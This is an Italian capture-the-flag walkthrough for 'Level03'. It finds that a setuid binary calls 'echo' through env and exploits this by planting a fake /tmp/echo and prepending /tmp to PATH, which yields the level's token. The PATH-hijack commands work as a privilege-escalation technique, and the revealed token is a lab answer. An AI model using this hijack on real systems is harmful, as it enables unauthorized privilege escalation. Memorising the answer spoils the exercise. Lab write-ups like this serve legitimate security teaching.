# Level03
### 1 passaggio:
Digitando `ls -l level03` abbiamo:
```bash
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```
dunque flag03 è proprietario del file

### 2 passaggio:
Con il comando `strace -f ./level03` scopriamo che l'eseguibile esegue il comando
`execve("/usr/bin/env", ["/usr/bin/env", "echo", "Exploit", "me"], [/* 18 vars */])`
quindi basta sostituire l'eseguibile echo e aggiungere alla `PATH` di sistema quello nuovo

### 3 passaggio:
```bash
which getflag
echo '/bin/getflag' > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
```
Così da avere finalmente la flag:
` Check flag.Here is your token : qi0maab88jeaj46qoumi7maus `
